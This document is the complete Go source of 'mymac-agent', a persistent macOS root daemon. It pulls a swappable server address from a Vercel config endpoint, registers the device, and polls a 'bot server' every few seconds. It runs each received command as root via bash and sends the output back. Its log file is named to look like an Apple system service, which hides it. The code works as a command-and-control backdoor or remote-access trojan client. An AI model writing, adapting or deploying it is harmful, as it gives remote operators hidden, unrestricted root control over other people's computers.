// mymac-agent – macOS persistent root daemon
// Boots → fetches server config from Vercel → connects to bot server → executes commands
// Config URL is the only thing baked in. Everything else is dynamic and updatable.
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/denisbrodbeck/machineid"
)

// ─── Baked in at build time via -ldflags ─────────────────────────────────────
// Only these two values are baked in. Everything else comes from Vercel at runtime.
var (
	configServerURL = "https://mymac-config.vercel.app" // Vercel config server (permanent)
	adminToken      = "CHANGEME"                         // x-admin-token for Vercel
	agentVersion    = "2.0.0"
)

// ─── Runtime config (fetched from Vercel, refreshed every 5 min) ─────────────
type ServerConfig struct {
	ServerURL   string `json:"serverUrl"`
	AgentSecret string `json:"agentSecret"`
	Version     int    `json:"version"`
	UpdatedAt   string `json:"updatedAt"`
}

var (
	currentConfig     ServerConfig
	currentConfigMu   sync.RWMutex
	lastKnownVersion  int
	configPollInterval = 5 * time.Minute
	cmdPollInterval    = 3 * time.Second
	heartbeatInterval  = 60 * time.Second
	cmdTimeout         = 60 * time.Second
	logFile            = "/var/log/com.apple.sysmon.agent.log"
)

// ─── Device identity ──────────────────────────────────────────────────────────
var (
	deviceID string
	hostname string
)

func initIdentity() {
	h, _ := os.Hostname()
	hostname = h

	// Stable machine UUID using hardware serial — survives OS reinstall but is
	// consistent across reboots and user/password changes.
	id, err := machineid.ProtectedID("mymac-agent")
	if err != nil {
		// Fallback: sha256 of hostname + arch
		sum := sha256.Sum256([]byte(h + runtime.GOARCH))
		id = fmt.Sprintf("%x", sum[:16])
	}
	deviceID = id
}

// ─── HTTP helpers ─────────────────────────────────────────────────────────────
var httpClient = &http.Client{Timeout: 15 * time.Second}

func doRequest(baseURL, method, path, authHeader, authValue string, body interface{}) ([]byte, int, error) {
	var bodyReader io.Reader
	if body != nil {
		data, err := json.Marshal(body)
		if err != nil {
			return nil, 0, err
		}
		bodyReader = bytes.NewReader(data)
	}
	req, err := http.NewRequest(method, baseURL+path, bodyReader)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set(authHeader, authValue)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
	return respBody, resp.StatusCode, err
}

// Call Vercel config server
func vercelRequest(method, path string, body interface{}) ([]byte, int, error) {
	return doRequest(configServerURL, method, path, "x-admin-token", adminToken, body)
}

// Call bot server (uses current agentSecret)
func botRequest(method, path string, body interface{}) ([]byte, int, error) {
	currentConfigMu.RLock()
	url := currentConfig.ServerURL
	secret := currentConfig.AgentSecret
	currentConfigMu.RUnlock()
	if url == "" {
		return nil, 0, fmt.Errorf("server URL not configured yet")
	}
	return doRequest(url, method, path, "x-agent-secret", secret, body)
}

// ─── Config management ────────────────────────────────────────────────────────
func fetchConfig() (ServerConfig, error) {
	body, status, err := vercelRequest("GET", "/api/config", nil)
	if err != nil {
		return ServerConfig{}, err
	}
	if status != 200 {
		return ServerConfig{}, fmt.Errorf("config server returned %d", status)
	}
	var cfg ServerConfig
	if err := json.Unmarshal(body, &cfg); err != nil {
		return ServerConfig{}, err
	}
	return cfg, nil
}

func applyConfig(cfg ServerConfig) {
	currentConfigMu.Lock()
	defer currentConfigMu.Unlock()
	currentConfig = cfg
	lastKnownVersion = cfg.Version
}

func configPoller() {
	for {
		time.Sleep(configPollInterval)
		cfg, err := fetchConfig()
		if err != nil {
			log.Printf("Config poll error: %v", err)
			continue
		}
		if cfg.Version != lastKnownVersion {
			log.Printf("Config updated (v%d → v%d) — switching to new server", lastKnownVersion, cfg.Version)
			applyConfig(cfg)
			// Send alert that config was picked up
			sendAlert(fmt.Sprintf("Agent on %s picked up new config v%d — connected to %s", hostname, cfg.Version, cfg.ServerURL))
		}
	}
}

// ─── Device registration ──────────────────────────────────────────────────────
func registerDevice() error {
	payload := map[string]string{
		"deviceId":     deviceID,
		"hostname":     hostname,
		"arch":         runtime.GOARCH,
		"agentVersion": agentVersion,
	}
	_, status, err := vercelRequest("POST", "/api/devices", payload)
	if err != nil {
		return err
	}
	if status != 200 {
		return fmt.Errorf("registration returned %d", status)
	}
	return nil
}

// ─── Heartbeat ────────────────────────────────────────────────────────────────
func heartbeatLoop() {
	for {
		time.Sleep(heartbeatInterval)
		body, status, err := vercelRequest("POST", "/api/devices/heartbeat", map[string]string{"deviceId": deviceID})
		if err != nil || status != 200 {
			log.Printf("Heartbeat failed: %v (status %d)", err, status)
			continue
		}
		// Check if config version changed — pick it up immediately
		var hbResp struct {
			ConfigVersion int `json:"configVersion"`
		}
		if err := json.Unmarshal(body, &hbResp); err == nil {
			if hbResp.ConfigVersion != lastKnownVersion {
				log.Printf("Heartbeat: config version mismatch (%d vs %d) — re-fetching", lastKnownVersion, hbResp.ConfigVersion)
				if cfg, err := fetchConfig(); err == nil {
					applyConfig(cfg)
				}
			}
		}
	}
}

// ─── Command execution ────────────────────────────────────────────────────────
func executeCommand(cmd string) (string, int) {
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()

	c := exec.CommandContext(ctx, "/bin/bash", "-c", cmd)
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	c.Env = []string{
		"HOME=/var/root",
		"USER=root",
		"LOGNAME=root",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/homebrew/bin",
		"SHELL=/bin/bash",
		"TERM=xterm-256color",
	}

	err := c.Run()
	code := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			code = exitErr.ExitCode()
		} else {
			code = -1
			out.WriteString("\n[agent] " + err.Error())
		}
	}

	output := out.String()
	if len(output) > 500_000 {
		output = output[:500_000] + "\n…(truncated by agent)"
	}
	return output, code
}

// ─── Alert ────────────────────────────────────────────────────────────────────
func sendAlert(message string) {
	payload := map[string]string{"hostname": hostname, "message": message}
	_, _, _ = botRequest("POST", "/api/alert", payload)
}

// ─── Command poll loop ────────────────────────────────────────────────────────
func commandLoop() {
	consecutiveErrors := 0

	for {
		// Poll for a command for this specific device
		body, status, err := botRequest("GET", "/api/command?device="+deviceID, nil)
		if err != nil {
			consecutiveErrors++
			backoff := time.Duration(consecutiveErrors) * 5 * time.Second
			if backoff > 2*time.Minute {
				backoff = 2 * time.Minute
			}
			log.Printf("Poll error (#%d): %v — sleeping %s", consecutiveErrors, err, backoff)
			time.Sleep(backoff)
			continue
		}

		consecutiveErrors = 0

		if status == 204 {
			time.Sleep(cmdPollInterval)
			continue
		}

		if status != 200 {
			log.Printf("Unexpected poll status: %d", status)
			time.Sleep(cmdPollInterval)
			continue
		}

		var cmd struct {
			ID  string `json:"id"`
			Cmd string `json:"cmd"`
		}
		if err := json.Unmarshal(body, &cmd); err != nil {
			log.Printf("Parse error: %v", err)
			time.Sleep(cmdPollInterval)
			continue
		}

		log.Printf("Execute [%s]: %s", cmd.ID[:8], cmd.Cmd)
		output, code := executeCommand(cmd.Cmd)
		log.Printf("Done    [%s]: exit=%d  %d bytes", cmd.ID[:8], code, len(output))

		result := map[string]interface{}{
			"id":       cmd.ID,
			"deviceId": deviceID,
			"hostname": hostname,
			"output":   output,
			"exitCode": code,
		}
		for attempt := 0; attempt < 5; attempt++ {
			_, status, err := botRequest("POST", "/api/result", result)
			if err == nil && status == 200 {
				break
			}
			log.Printf("Result post failed (attempt %d): %v status=%d", attempt+1, err, status)
			time.Sleep(3 * time.Second)
		}
	}
}

// ─── Main ─────────────────────────────────────────────────────────────────────
func main() {
	// Set up file logging
	if err := os.MkdirAll(filepath.Dir(logFile), 0750); err == nil {
		if f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600); err == nil {
			log.SetOutput(io.MultiWriter(os.Stderr, f))
		}
	}
	log.SetFlags(log.Ldate | log.Ltime | log.Lmsgprefix)
	log.SetPrefix("[mymac-agent] ")

	initIdentity()
	log.Printf("Starting — hostname=%s deviceId=%s arch=%s version=%s", hostname, deviceID[:8], runtime.GOARCH, agentVersion)
	log.Printf("Config server: %s", configServerURL)

	// ── Step 1: Fetch config from Vercel (retry until we get it) ──────────────
	log.Println("Fetching config from Vercel...")
	for {
		cfg, err := fetchConfig()
		if err != nil {
			log.Printf("Config fetch error: %v — retrying in 10s", err)
			time.Sleep(10 * time.Second)
			continue
		}
		if cfg.ServerURL == "" {
			log.Println("Config has no serverUrl yet — waiting for admin to set it. Retrying in 15s...")
			time.Sleep(15 * time.Second)
			continue
		}
		applyConfig(cfg)
		log.Printf("Config loaded v%d — server: %s", cfg.Version, cfg.ServerURL)
		break
	}

	// ── Step 2: Register device on Vercel ─────────────────────────────────────
	for attempt := 0; attempt < 10; attempt++ {
		if err := registerDevice(); err != nil {
			log.Printf("Registration failed (attempt %d): %v", attempt+1, err)
			time.Sleep(10 * time.Second)
			continue
		}
		log.Printf("Device registered: %s (%s)", hostname, deviceID[:8])
		break
	}

	// ── Step 3: Alert bot server we're online ──────────────────────────────────
	go func() {
		time.Sleep(2 * time.Second) // let config settle
		sendAlert(fmt.Sprintf("Agent online\nHostname: %s\nArch: %s\nVersion: %s", hostname, runtime.GOARCH, agentVersion))
	}()

	// ── Step 4: Start background loops ────────────────────────────────────────
	go configPoller()
	go heartbeatLoop()

	// ── Step 5: Command poll loop (blocks forever) ─────────────────────────────
	commandLoop()
}
